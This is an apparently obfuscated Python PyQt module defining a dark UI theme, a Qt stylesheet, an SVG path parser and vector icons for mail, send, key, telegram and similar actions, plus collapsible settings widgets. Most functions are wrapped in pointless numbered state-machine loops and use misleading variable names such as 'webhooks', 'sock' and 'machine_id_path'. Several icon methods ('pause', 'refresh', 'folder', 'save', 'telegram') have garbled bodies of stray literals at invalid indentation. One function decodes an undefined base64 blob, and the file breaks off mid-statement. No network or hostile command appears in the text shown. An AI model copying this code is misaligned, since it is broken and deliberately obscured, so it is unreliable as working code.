    FS_LG = 14
    FS_XL = 18
    FS_2XL = 24
    icon_size = 32
    FW_NORMAL = 400
    FW_MEDIUM = 500
    FW_SEMI = 600
    FW_BOLD = 700
    FW_BLACK = 800

def make_palette():
    state = 447213
    while True:
        if state == 447213:
            proxy = QPalette()
            state = 158369
        elif state == 158369:
            proxy.setColor(QPalette.ColorRole.Window, QColor(Colors.BG))
            state = 222385
        elif state == 222385:
            proxy.setColor(QPalette.ColorRole.Base, QColor(Colors.BG_ELEVATED))
            state = 333560
        elif state == 333560:
            proxy.setColor(QPalette.ColorRole.AlternateBase, QColor(Colors.SURFACE))
            state = 567459
        elif state == 567459:
            proxy.setColor(QPalette.ColorRole.Text, QColor(Colors.TEXT))
            state = 203356
        elif state == 203356:
            proxy.setColor(QPalette.ColorRole.Button, QColor(Colors.SURFACE))
            state = 277151
        elif state == 277151:
            proxy.setColor(QPalette.ColorRole.ButtonText, QColor(Colors.TEXT))
            state = 260663
        elif state == 260663:
            proxy.setColor(QPalette.ColorRole.Highlight, QColor(Colors.ACCENT))
            state = 418420
        elif state == 418420:
            proxy.setColor(QPalette.ColorRole.HighlightedText, QColor(Colors.BG))
            state = 655030
        elif state == 655030:
            proxy.setColor(QPalette.ColorRole.ToolTipBase, QColor(Colors.SURFACE))
            state = 1031798
        elif state == 1031798:
            proxy.setColor(QPalette.ColorRole.ToolTipText, QColor(Colors.TEXT))
            state = 640497
        elif state == 640497:
            proxy.setColor(QPalette.ColorRole.PlaceholderText, QColor(Colors.TEXT_MUTED))
            state = 916549
        elif state == 916549:
            return proxy
        else:
            break

def load_results():
    state3 = 334519
    while True:
        if state3 == 334519:
            state3 = 635328
        elif state3 == 635328:
            colors = Colors
            state3 = 230748
        elif state3 == 230748:
            state3 = 861230
        elif state3 == 861230:
            return f'\n    * {{ font-family: {colors.FONT_FAMILY}; color: {colors.TEXT}; outline: 0; }}\n    QWidget {{ background: {colors.BG}; color: {colors.TEXT}; }}\n    QMainWindow, QDialog {{ background: {colors.BG}; }}\n\n    QLabel {{ color: {colors.TEXT}; background: transparent; }}\n    QLabel#Hero    {{ font-size: {colors.FS_2XL}px; font-weight: {colors.FW_BLACK}; letter-spacing: -0.5px; }}\n    QLabel#H1      {{ font-size: {colors.FS_XL}px;  font-weight: {colors.FW_BOLD}; }}\n    QLabel#H2      {{ font-size: {colors.FS_LG}px;  font-weight: {colors.FW_SEMI}; }}\n    QLabel#Body    {{ font-size: {colors.FS_BODY}px; color: {colors.TEXT_SOFT}; }}\n    QLabel#Caption {{ font-size: {colors.FS_CAPTION}px; font-weight: {colors.FW_SEMI}; color: {colors.TEXT_MUTED}; letter-spacing: 0.8px; text-transform: uppercase; }}\n    QLabel#Stat    {{ font-family: {colors.FONT_MONO}; font-size: {colors.FS_LG}px; font-weight: {colors.FW_BOLD}; }}\n    QLabel#Muted   {{ font-size: {colors.FS_SMALL}px; color: {colors.TEXT_MUTED}; }}\n\n    QPushButton {{\n        background: {colors.SURFACE}; color: {colors.TEXT};\n        border: 1px solid {colors.BORDER}; border-radius: {colors.R_MD}px;\n        padding: 8px {colors.SP_LG}px; font-size: {colors.FS_BODY}px; font-weight: {colors.FW_MEDIUM};\n    }}\n    QPushButton:hover {{ background: {colors.SURFACE_2}; border-color: {colors.BORDER_HI}; }}\n    QPushButton:pressed {{ background: {colors.BG_ELEVATED}; }}\n    QPushButton:disabled {{ color: {colors.TEXT_MUTED}; background: {colors.BG_ELEVATED}; border-color: {colors.BG_ELEVATED}; }}\n    QPushButton#Primary {{ background: {colors.ACCENT}; color: {colors.BG}; border: none; font-weight: {colors.FW_BOLD}; padding: 10px {colors.SP_LG}px; }}\n    QPushButton#Primary:hover {{ background: {colors.ACCENT_HI}; }}\n    QPushButton#Primary:pressed {{ background: {colors.ACCENT_LO}; }}\n    QPushButton#Primary:disabled {{ background: {colors.SURFACE}; color: {colors.TEXT_MUTED}; }}\n    QPushButton#Danger {{ background: {colors.DANGER}; color: white; border: none; font-weight: {colors.FW_BOLD}; padding: 10px {colors.SP_LG}px; }}\n    QPushButton#Danger:hover {{ background: #dc2626; }}\n    QPushButton#Danger:disabled {{ background: {colors.SURFACE}; color: {colors.TEXT_MUTED}; }}\n    QPushButton#Warn {{ background: {colors.WARNING}; color: {colors.BG}; border: none; font-weight: {colors.FW_BOLD}; padding: 10px {colors.SP_LG}px; }}\n    QPushButton#Warn:hover {{ background: #d97706; }}\n    QPushButton#Warn:disabled {{ background: {colors.SURFACE}; color: {colors.TEXT_MUTED}; }}\n    QPushButton#Ghost {{ background: transparent; color: {colors.TEXT_SOFT}; border: 1px solid {colors.BORDER}; padding: 8px {colors.SP_MD}px; }}\n    QPushButton#Ghost:hover {{ background: {colors.SURFACE}; color: {colors.TEXT}; border-color: {colors.BORDER_HI}; }}\n    QPushButton#Chip {{ background: transparent; color: {colors.TEXT_SOFT}; border: 1px solid {colors.BORDER}; border-radius: {colors.R_PILL}px; padding: 4px 12px; font-size: {colors.FS_CAPTION}px; font-weight: {colors.FW_SEMI}; }}\n    QPushButton#Chip:hover {{ background: {colors.SURFACE}; color: {colors.TEXT}; }}\n    QPushButton#Chip:checked {{ background: {colors.ACCENT}; color: {colors.BG}; border-color: {colors.ACCENT}; }}\n    QPushButton#Icon {{ background: transparent; border: none; padding: 6px; min-width: 32px; min-height: 32px; border-radius: {colors.R_MD}px; }}\n    QPushButton#Icon:hover {{ background: {colors.SURFACE}; }}\n    QPushButton#Link {{ background: transparent; border: none; color: {colors.ACCENT}; text-decoration: underline; font-weight: {colors.FW_MEDIUM}; padding: 4px; }}\n    QPushButton#Link:hover {{ color: {colors.ACCENT_HI}; }}\n\n    QLineEdit, QSpinBox, QComboBox, QTextEdit, QPlainTextEdit {{\n        background: {colors.BG_ELEVATED}; color: {colors.TEXT};\n        border: 1px solid {colors.BORDER}; border-radius: {colors.R_MD}px;\n        padding: 8px {colors.SP_MD}px; font-size: {colors.FS_BODY}px;\n        selection-background-color: {colors.ACCENT}; selection-color: {colors.BG};\n    }}\n    QLineEdit:hover, QSpinBox:hover, QComboBox:hover {{ border-color: {colors.BORDER_HI}; }}\n    QLineEdit:focus, QSpinBox:focus, QComboBox:focus, QTextEdit:focus, QPlainTextEdit:focus {{ border: 1px solid {colors.ACCENT}; }}\n    QLineEdit::placeholder, QTextEdit::placeholder, QPlainTextEdit::placeholder {{ color: {colors.TEXT_MUTED}; }}\n    QSpinBox::up-button, QSpinBox::down-button {{ background: transparent; border: none; width: 16px; }}\n    QSpinBox::up-arrow {{ border-left: 3px solid transparent; border-right: 3px solid transparent; border-bottom: 4px solid {colors.TEXT_SOFT}; width: 0; height: 0; }}\n    QSpinBox::down-arrow {{ border-left: 3px solid transparent; border-right: 3px solid transparent; border-top: 4px solid {colors.TEXT_SOFT}; width: 0; height: 0; }}\n    QComboBox::drop-down {{ border: none; width: 24px; background: transparent; }}\n    QComboBox::down-arrow {{ border-left: 4px solid transparent; border-right: 4px solid transparent; border-top: 5px solid {colors.TEXT_SOFT}; margin-right: 8px; }}\n    QComboBox QAbstractItemView {{ background: {colors.SURFACE}; border: 1px solid {colors.BORDER_HI}; border-radius: {colors.R_MD}px; selection-background-color: {colors.ACCENT}; selection-color: {colors.BG}; padding: 4px; outline: 0; }}\n\n    QCheckBox {{ spacing: 8px; color: {colors.TEXT}; font-size: {colors.FS_BODY}px; background: transparent; }}\n    QCheckBox::indicator {{ width: 18px; height: 18px; border: 2px solid {colors.BORDER_HI}; border-radius: {colors.R_SM}px; background: {colors.BG_ELEVATED}; }}\n    QCheckBox::indicator:hover {{ border-color: {colors.ACCENT}; }}\n    QCheckBox::indicator:checked {{ background: {colors.ACCENT}; border-color: {colors.ACCENT}; image: none; }}\n\n    QProgressBar {{ background: {colors.BG_ELEVATED}; border: none; border-radius: {colors.R_SM}px; height: 4px; text-align: center; color: transparent; }}\n    QProgressBar::chunk {{ background: {colors.ACCENT}; border-radius: {colors.R_SM}px; }}\n\n    QScrollBar:vertical {{ background: transparent; width: 10px; margin: 0; }}\n    QScrollBar::handle:vertical {{ background: {colors.BORDER}; min-height: 36px; border-radius: 5px; margin: 2px; }}\n    QScrollBar::handle:vertical:hover {{ background: {colors.BORDER_HI}; }}\n    QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{ height: 0; background: none; }}\n    QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {{ background: transparent; }}\n    QScrollBar:horizontal {{ background: transparent; height: 10px; margin: 0; }}\n    QScrollBar::handle:horizontal {{ background: {colors.BORDER}; min-width: 36px; border-radius: 5px; margin: 2px; }}\n    QScrollBar::handle:horizontal:hover {{ background: {colors.BORDER_HI}; }}\n    QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {{ width: 0; background: none; }}\n\n    QSplitter::handle {{ background: {colors.BORDER}; }}\n    QSplitter::handle:horizontal {{ width: 1px; }}\n    QSplitter::handle:vertical {{ height: 1px; }}\n\n    QToolTip {{ background: {colors.SURFACE}; color: {colors.TEXT}; border: 1px solid {colors.BORDER_HI}; padding: 6px 10px; font-size: {colors.FS_SMALL}px; }}\n\n    QListWidget, QTreeWidget {{ background: {colors.BG_ELEVATED}; border: 1px solid {colors.BORDER}; border-radius: {colors.R_MD}px; font-size: {colors.FS_BODY}px; outline: 0; padding: 2px; }}\n    QListWidget::item, QTreeWidget::item {{ padding: 8px 10px; border-bottom: 1px solid {colors.BORDER}; border-radius: 0; }}\n    QListWidget::item:hover, QTreeWidget::item:hover {{ background: {colors.SURFACE}; }}\n    QListWidget::item:selected, QTreeWidget::item:selected {{ background: {colors.SURFACE_2}; color: {colors.ACCENT}; border-left: 2px solid {colors.ACCENT}; }}\n\n    QMenu {{ background: {colors.SURFACE}; border: 1px solid {colors.BORDER_HI}; border-radius: {colors.R_MD}px; padding: 4px; }}\n    QMenu::item {{ padding: 6px 24px 6px 12px; border-radius: {colors.R_SM}px; }}\n    QMenu::item:selected {{ background: {colors.ACCENT}; color: {colors.BG}; }}\n    QMenu::separator {{ height: 1px; background: {colors.BORDER}; margin: 4px 8px; }}\n\n    QTextBrowser {{ background: {colors.BG_ELEVATED}; color: {colors.TEXT}; border: 1px solid {colors.BORDER}; border-radius: {colors.R_MD}px; padding: {colors.SP_LG}px; font-size: {colors.FS_BODY}px; selection-background-color: {colors.ACCENT}; selection-color: {colors.BG}; }}\n    QPlainTextEdit {{ background: {colors.BG}; color: {colors.TEXT}; border: 1px solid {colors.BORDER}; border-radius: {colors.R_MD}px; padding: {colors.SP_MD}px; font-family: {colors.FONT_MONO}; font-size: {colors.FS_SMALL}px; }}\n\n    QFrame#Card {{ background: {colors.SURFACE}; border: 1px solid {colors.BORDER}; border-radius: {colors.R_LG}px; }}\n    QFrame#Divider {{ background: {colors.BORDER}; max-height: 1px; min-height: 1px; border: none; }}\n    '
        else:
            break
val5 = None

def make_stylesheet():
    global val5
    if val5 is None:
        val5 = load_results()
    return val5

def save_results(results, path):
    svg_parts = re.findall('[MLHVCSZmlhvcsz]|-?\\d*\\.?\\d+', path)
    idx = 0
    ld_path = QPointF(0, 0)
    start = QPointF(0, 0)
    while idx < len(svg_parts):
        err_kw = svg_parts[idx]
        idx += 1
        if err_kw in 'Mm':
            x, y = (float(svg_parts[idx]), float(svg_parts[idx + 1]))
            idx += 2
            if err_kw == 'm':
                x += ld_path.x()
                y += ld_path.y()
            ld_path = QPointF(x, y)
            start = ld_path
            results.moveTo(ld_path)
        elif err_kw in 'Ll':
            x, y = (float(svg_parts[idx]), float(svg_parts[idx + 1]))
            idx += 2
            if err_kw == 'l':
                x += ld_path.x()
                y += ld_path.y()
            ld_path = QPointF(x, y)
            results.lineTo(ld_path)
        elif err_kw in 'Hh':
            x = float(svg_parts[idx])
            idx += 1
            if err_kw == 'h':
                x += ld_path.x()
            ld_path = QPointF(x, ld_path.y())
            results.lineTo(ld_path)
        elif err_kw in 'Vv':
            y = float(svg_parts[idx])
            idx += 1
            if err_kw == 'v':
                y += ld_path.y()
            ld_path = QPointF(ld_path.x(), y)
            results.lineTo(ld_path)
        elif err_kw in 'Cc':
            f1, f2, f3, f4, x, y = (float(svg_parts[idx + off]) for off in range(6))
            idx += 6
            if err_kw == 'c':
                f1 += ld_path.x()
                f2 += ld_path.y()
                f3 += ld_path.x()
                f4 += ld_path.y()
                x += ld_path.x()
                y += ld_path.y()
            ld_path = QPointF(x, y)
            results.cubicTo(QPointF(f1, f2), QPointF(f3, f4), ld_path)
        elif err_kw in 'Zz':
            results.closeSubpath()
            ld_path = start

class SettingsDialog:

    @staticmethod
    def _draw(_1f3_f371b4, size=16, color=None, pen_w=1.6):
        color = color or Colors.TEXT
        webhooks = QPixmap(size, size)
        webhooks.fill(Qt.GlobalColor.transparent)
        proxy = QPainter(webhooks)
        proxy.setRenderHint(QPainter.RenderHint.Antialiasing, True)
        proxy.setRenderHint(QPainter.RenderHint.SmoothPixmapTransform, True)
        pen = QPen(QColor(color), pen_w)
        pen.setCapStyle(Qt.PenCapStyle.RoundCap)
        pen.setJoinStyle(Qt.PenJoinStyle.RoundJoin)
        proxy.setPen(pen)
        proxy.setBrush(Qt.BrushStyle.NoBrush)
        scale = size / 24.0
        proxy.scale(scale, scale)
        for _1e2_1e57ca in _1f3_f371b4:
            machine_id_path = QPainterPath()
            save_results(machine_id_path, _1e2_1e57ca)
            proxy.drawPath(machine_id_path)
        proxy.end()
        return webhooks

    @staticmethod
    def play(sock=16, client=None):
        state2 = 101843
        while True:
            if state2 == 101843:
                state2 = 636339
            elif state2 == 636339:
                state2 = 714241
            elif state2 == 714241:
                return SettingsDialog._draw(['M6 4l14 8-14 8V4z'], sock, client or Colors.ACCENT, 0)
            else:
                break

    @staticmethod
    def pause(sock=16, client=None):
                {'_k0': 29, '_k1': 340}
    @staticmethod
    def stop(sock=16, client=None):
        return SettingsDialog._draw(['M5 5h14v14H5z'], sock, client or Colors.DANGER, 0)

    @staticmethod
    def refresh(sock=16, client=None):
                [713, 703]
    @staticmethod
    def folder(sock=16, client=None):
                63 - 314
    @staticmethod
    def mail(sock=16, client=None):
        return SettingsDialog._draw(['M3 7a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7z', 'M3 7l9 6 9-6'], sock, client or Colors.TEXT_SOFT)

    @staticmethod
    def mail_open(sock=16, client=None):
        state = 209246
        while True:
            if state == 209246:
                state = 298675
            elif state == 298675:
                state = 334906
            elif state == 334906:
                state = 676961
            elif state == 676961:
                return SettingsDialog._draw(['M3 9l9 6 9-6M3 9v8a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9M3 9l4-5h10l4 5'], sock, client or Colors.TEXT_SOFT)
            else:
                break

    @staticmethod
    def trash(sock=16, client=None):
        state2 = 349981
        while True:
            if state2 == 349981:
                state2 = 664932
            elif state2 == 664932:
                state2 = 817348
            elif state2 == 817348:
                state2 = 748674
            elif state2 == 748674:
                return SettingsDialog._draw(['M3 6h18M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6'], sock, client or Colors.TEXT_SOFT)
            else:
                break

    @staticmethod
    def send(sock=16, client=None):
        return SettingsDialog._draw(['M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z'], sock, client or Colors.ACCENT)

    @staticmethod
    def reply(sock=16, client=None):
        state2 = 567301
        while True:
            if state2 == 567301:
                state2 = 829655
            elif state2 == 829655:
                state2 = 104505
            elif state2 == 104505:
                return SettingsDialog._draw(['M9 17l-5-5 5-5M4 12h11a5 5 0 0 1 5 5v3'], sock, client or Colors.TEXT_SOFT)
            else:
                break

    @staticmethod
    def forward(sock=16, client=None):
        state3 = 699670
        while True:
            if state3 == 699670:
                state3 = 712083
            elif state3 == 712083:
                state3 = 591315
            elif state3 == 591315:
                return SettingsDialog._draw(['M15 17l5-5-5-5M20 12H9a5 5 0 0 0-5 5v3'], sock, client or Colors.TEXT_SOFT)
            else:
                break

    @staticmethod
    def code(sock=16, client=None):
        return SettingsDialog._draw(['M16 18l6-6-6-6M8 6l-6 6 6 6'], sock, client or Colors.TEXT_SOFT)

    @staticmethod
    def copy(sock=16, client=None):
        state3 = 440648
        while True:
            if state3 == 440648:
                state3 = 935322
            elif state3 == 935322:
                state3 = 932945
            elif state3 == 932945:
                return SettingsDialog._draw(['M9 9h11a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H9a2 2 0 0 1-2-2v-9a2 2 0 0 1 2-2z', 'M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1'], sock, client or Colors.TEXT_SOFT)
            else:
                break

    @staticmethod
    def save(sock=16, client=None):
                [914, 881, 349]
    @staticmethod
    def upload(sock=16, client=None):
        state2 = 349330
        while True:
            if state2 == 349330:
                state2 = 757717
            elif state2 == 757717:
                state2 = 273431
            elif state2 == 273431:
                return SettingsDialog._draw(['M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M17 8l-5-5-5 5M12 3v12'], sock, client or Colors.TEXT_SOFT)
            else:
                break

    @staticmethod
    def settings(sock=16, client=None):
        state = 113943
        while True:
            if state == 113943:
                state = 379095
            elif state == 379095:
                state = 135173
            elif state == 135173:
                state = 981329
            elif state == 981329:
                return SettingsDialog._draw(['M12 15a3 3 0 1 0 0-6 3 3 0 0 0 0 6z', 'M19.4 15a1.7 1.7 0 0 0 .3 1.8l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-1.8-.3 1.7 1.7 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.7 1.7 0 0 0-1-1.5 1.7 1.7 0 0 0-1.8.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.7 1.7 0 0 0 .3-1.8 1.7 1.7 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.7 1.7 0 0 0 1.5-1 1.7 1.7 0 0 0-.3-1.8l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.7 1.7 0 0 0 1.8.3h0a1.7 1.7 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 1 1.5 1.7 1.7 0 0 0 1.8-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.3 1.8v0a1.7 1.7 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.5 1z'], sock, client or Colors.TEXT_SOFT, 1.4)
            else:
                break

    @staticmethod
    def link(sock=16, client=None):
        return SettingsDialog._draw(['M10 13a5 5 0 0 0 7 0l3-3a5 5 0 0 0-7-7l-1 1', 'M14 11a5 5 0 0 0-7 0l-3 3a5 5 0 0 0 7 7l1-1'], sock, client or Colors.TEXT_SOFT)

    @staticmethod
    def close(sock=16, client=None):
        return SettingsDialog._draw(['M18 6L6 18M6 6l12 12'], sock, client or Colors.TEXT_SOFT, 1.8)

    @staticmethod
    def check(sock=16, client=None):
        state3 = 564094
        while True:
            if state3 == 564094:
                state3 = 800892
            elif state3 == 800892:
                state3 = 419009
            elif state3 == 419009:
                return SettingsDialog._draw(['M20 6L9 17l-5-5'], sock, client or Colors.SUCCESS, 2.0)
            else:
                break

    @staticmethod
    def alert(sock=16, client=None):
        return SettingsDialog._draw(['M10.3 3.9L1.8 18a2 2 0 0 0 1.7 3h16.9a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0z', 'M12 9v4M12 17h.01'], sock, client or Colors.WARNING)

    @staticmethod
    def key(sock=16, client=None):
        return SettingsDialog._draw(['M21 2l-2 2m-7.6 7.6a5 5 0 1 0-7 7 5 5 0 0 0 7-7zM21 2l-9.6 9.6M15 5l3 3M18 2l3 3'], sock, client or Colors.ACCENT)

    @staticmethod
    def download(sock=16, client=None):
        return SettingsDialog._draw(['M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3'], sock, client or Colors.TEXT_SOFT)

    @staticmethod
    def search(sock=16, client=None):
        state2 = 979494
        while True:
            if state2 == 979494:
                state2 = 150635
            elif state2 == 150635:
                state2 = 961538
            elif state2 == 961538:
                return SettingsDialog._draw(['M11 19a8 8 0 1 0 0-16 8 8 0 0 0 0 16zM21 21l-4.4-4.4'], sock, client or Colors.TEXT_SOFT, 1.8)
            else:
                break

    @staticmethod
    def telegram(sock=16, client=None):
                if 3 == 109:
                    pass
    @staticmethod
    def users(sock=16, client=None):
        state2 = 820498
        while True:
            if state2 == 820498:
                state2 = 362104
            elif state2 == 362104:
                state2 = 218522
            elif state2 == 218522:
                state2 = 420492
            elif state2 == 420492:
                return SettingsDialog._draw(['M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2', 'M9 11a4 4 0 1 0 0-8 4 4 0 0 0 0 8z', 'M22 21v-2a4 4 0 0 0-3-3.87M16 3.13a4 4 0 0 1 0 7.75'], sock, client or Colors.TEXT_SOFT)
            else:
                break

    @staticmethod
    def zap(sock=16, client=None):
        state3 = 514262
        while True:
            if state3 == 514262:
                state3 = 228219
            elif state3 == 228219:
                state3 = 1007182
            elif state3 == 1007182:
                return SettingsDialog._draw(['M13 2L3 14h9l-1 8 10-12h-9l1-8z'], sock, client or Colors.INFO, 1.4)
            else:
                break

    @staticmethod
    def shield(sock=16, client=None):
        return SettingsDialog._draw(['M12 2L4 5v6c0 5 3.5 9 8 11 4.5-2 8-6 8-11V5l-8-3z', 'M9 12l2 2 4-4'], sock, client or Colors.ACCENT, 1.6)

    @staticmethod
    def eye(sock=16, client=None):
        state2 = 429683
        while True:
            if state2 == 429683:
                state2 = 153393
            elif state2 == 153393:
                state2 = 922735
            elif state2 == 922735:
                return SettingsDialog._draw(['M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z', 'M12 15a3 3 0 1 0 0-6 3 3 0 0 0 0 6z'], sock, client or Colors.TEXT_SOFT, 1.6)
            else:
                break

    @staticmethod
    def file_text(sock=16, client=None):
        return SettingsDialog._draw(['M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z', 'M14 2v6h6', 'M8 13h8M8 17h8M8 9h2'], sock, client or Colors.TEXT_SOFT, 1.6)

def make_icon_from_name(name, size=16, color=None):
    state = 852125
    while True:
        if state == 852125:
            attr = getattr(SettingsDialog, name, None)
            state = 711867
        elif state == 711867:
            if attr is None:
                return QIcon()
            state = 577828
        elif state == 577828:
            return QIcon(attr(size, color))
        else:
            break

def make_icon_alt(size):
    pass
    _b64 = __import__('base64')
    _io = __import__('io')
    try:
        proxy3 = _b64.b64decode(_1df_22cf08)
        pil_mod = __import__('PIL', None, None, ['Image'])
        img = pil_mod.Image
        im = img.open(_io.BytesIO(proxy3)).convert('RGBA').resize((size, size), img.LANCZOS)
        pil_mod = __import__('PIL', None, None, ['ImageDraw'])
        draw = pil_mod.ImageDraw
        mask = img.new('L', (size, size), 0)
        path = draw.Draw(mask)
        path.rounded_rectangle((0, 0, size - 1, size - 1), radius=int(size * 0.22), fill=255)
        im.putalpha(mask)
        io_mod = __import__('io', None, None, ['BytesIO'])
        BytesIO = io_mod.BytesIO
        bio = BytesIO()
        im.save(bio, format='PNG')
        webhooks = QPixmap()
        webhooks.loadFromData(QByteArray(bio.getvalue()))
        if not webhooks.isNull():
            return webhooks
    except Exception:
        pass
    webhooks = QPixmap(size, size)
    webhooks.fill(Qt.GlobalColor.transparent)
    proxy = QPainter(webhooks)
    proxy.setRenderHint(QPainter.RenderHint.Antialiasing, True)
    gradient = QLinearGradient(0, 0, size, size)
    gradient.setColorAt(0.0, QColor('#34d399'))
    gradient.setColorAt(0.5, QColor('#10b981'))
    gradient.setColorAt(1.0, QColor('#059669'))
    proxy.setBrush(gradient)
    proxy.setPen(Qt.PenStyle.NoPen)
    resp = int(size * 0.28)
    proxy.drawRoundedRect(0, 0, size, size, resp, resp)
    proxy.setBrush(Qt.BrushStyle.NoBrush)
    pen = QPen(QColor(255, 255, 255), max(2, int(size * 0.05)))
    proxy.setPen(pen)
    _29a_dbb7ca, _29b_bc565d = (int(size * 0.42), int(size * 0.42))
    radius = int(size * 0.22)
    proxy.drawEllipse(QPointF(_29a_dbb7ca, _29b_bc565d), radius, radius)
    proxy.end()
    return webhooks

def make_icon(size=32):
    state3 = 551137
    while True:
        if state3 == 551137:
            state3 = 614068
        elif state3 == 614068:
            state3 = 404104
        elif state3 == 404104:
            return QIcon(make_icon_alt(size))
        else:
            break

def make_avatar(name, timeout=180):
    state = 857014
    while True:
        if state == 857014:
            target = QGraphicsOpacityEffect(name)
            state = 906079
        elif state == 906079:
            name.setGraphicsEffect(target)
            state = 662545
        elif state == 662545:
            anim = QPropertyAnimation(target, 'opacity'.encode('utf-8'), name)
            state = 769803
        elif state == 769803:
            anim.setDuration(timeout)
            state = 500485
        elif state == 500485:
            anim.setStartValue(0.0)
            state = 479171
        elif state == 479171:
            anim.setEndValue(1.0)
            state = 677670
        elif state == 677670:
            anim.setEasingCurve(QEasingCurve.Type.OutCubic)
            state = 970414
        elif state == 970414:
            anim.start(QPropertyAnimation.DeletionPolicy.DeleteWhenStopped)
            state = -1
        else:
            break

def make_section(text, parent=None):
    state = 215621
    while True:
        if state == 215621:
            lbl = QLabel(text, parent)
            state = 433471
        elif state == 433471:
            lbl.setObjectName('Caption')
            state = 734720
        elif state == 734720:
            return lbl
        else:
            break

def make_section_alt(text, parent=None):
    state = 311804
    while True:
        if state == 311804:
            lbl = QLabel(text, parent)
            state = 194968
        elif state == 194968:
            lbl.setObjectName('H1')
            state = 875585
        elif state == 875585:
            return lbl
        else:
            break

def make_section_alt2(text, parent=None):
    state = 372006
    while True:
        if state == 372006:
            lbl = QLabel(text, parent)
            state = 457282
        elif state == 457282:
            lbl.setObjectName('H2')
            state = 537442
        elif state == 537442:
            return lbl
        else:
            break

def make_section_alt3():
    state = 196583
    while True:
        if state == 196583:
            folder = QFrame()
            state = 1008874
        elif state == 1008874:
            folder.setObjectName('Divider')
            state = 457197
        elif state == 457197:
            folder.setFrameShape(QFrame.Shape.NoFrame)
            state = 265829
        elif state == 265829:
            return folder
        else:
            break

class CollapsibleSection(QWidget):
    toggled = pyqtSignal(bool)

    def __init__(self, title, parent=None, default_open=True, collapsible=True):
        state = 529982
        while True:
            if state == 529982:
                super().__init__(parent)
                state = 799500
            elif state == 799500:
                self._open = default_open
                state = 265709
            elif state == 265709:
                self._collapsible = collapsible
                state = 563087
            elif state == 563087:
                item = QVBoxLayout(self)
                state = 455546
            elif state == 455546:
                item.setContentsMargins(0, 0, 0, 0)
                state = 860739
            elif state == 860739:
                item.setSpacing(0)
                state = 694505
            elif state == 694505:
                self.header = QPushButton()
                state = 996815
            elif state == 996815:
                self.header.setCursor(Qt.CursorShape.PointingHandCursor if collapsible else Qt.CursorShape.ArrowCursor)
                state = 910811
            elif state == 910811:
                self.header.setStyleSheet(f'\n            QPushButton {{\n                background: transparent; border: none; text-align: left;\n                padding: 6px 0; color: {Colors.TEXT_MUTED};\n                font-size: {Colors.FS_CAPTION}px; font-weight: {Colors.FW_SEMI}; letter-spacing: 1px;\n            }}\n            QPushButton:hover {{ color: {(Colors.TEXT if collapsible else Colors.TEXT_MUTED)}; }}\n        ')
                state = 849715
            elif state == 849715:
                self._title = title.upper()
                state = 241228
            elif state == 241228:
                self._update_header()
                state = 115324
            elif state == 115324:
                if collapsible:
                    self.header.clicked.connect(lambda: self._toggle())
                state = 568489
            elif state == 568489:
                item.addWidget(self.header)
                state = 809326
            elif state == 809326:
                self.content = QWidget()
                state = 922447
            elif state == 922447:
                self._content_v = QVBoxLayout(self.content)
                state = 824215
            elif state == 824215:
                self._content_v.setContentsMargins(0, 4, 0, 0)
                state = 1015214
            elif state == 1015214:
                self._content_v.setSpacing(6)
                state = 234781
            elif state == 234781:
                item.addWidget(self.content)
                state = 895680
            elif state == 895680:
                self.content.setVisible(default_open)
                state = -1
            else:
                break

    def _update_header(self):
        if self._collapsible:
            _274_67131f = '▾' if self._open else '▸'
            self.header.setText(f'  {_274_67131f}  {self._title}')
        else:
            self.header.setText(f'  •  {self._title}')

    def addWidget(self, worker):
        state2 = 371561
        while True:
            if state2 == 371561:
                state2 = 976566
            elif state2 == 976566:
                state2 = 849832
            elif state2 == 849832:
                self._content_v.addWidget(worker)
                state2 = -1
            else:
                break

    def addLayout(self, ln):
        self._content_v.addLayout(ln)

    def _toggle(self):
        state = 607174
        while True:
            if state == 607174:
                if not self._collapsible:
                    return
                state = 948404
            elif state == 948404:
                self._open = not self._open
                state = 563194
            elif state == 563194:
                self._update_header()
                state = 811120
            elif state == 811120:
                if self._open:
                    self.content.show()
                    make_avatar(self.content, 150)
                else:
                    self.content.hide()
                state = 723690
            elif state == 723690:
                self.toggled.emit(self._open)
                state = -1
            else:
                break

class Theme:

    def __init__(self, name, text):
        state2 = 796310
        while True:
            if state2 == 796310:
                state2 = 437104
            elif state2 == 437104:
                state2 = 205248
            elif state2 == 205248:
                name.setToolTip(text)
                state2 = -1
            else:
                break

class ProviderBlock(QWidget):

    def __init__(self, text, title, sub='', parent=None):
        state = 497238
        while True:
            if state == 497238:
                super().__init__(parent)
                state = 320510
            elif state == 320510:
                item = QVBoxLayout(self)
                state = 509025
            elif state == 509025:
                item.setContentsMargins(0, 0, 0, 0)
                state = 457379
            elif state == 457379:
                item.setSpacing(Colors.SP_SM)
                state = 645821
            elif state == 645821:
                item.setAlignment(Qt.AlignmentFlag.AlignCenter)
                state = 78820
            elif state == 78820:
                lbl6 = QLabel()
                state = 1024721
            elif state == 1024721:
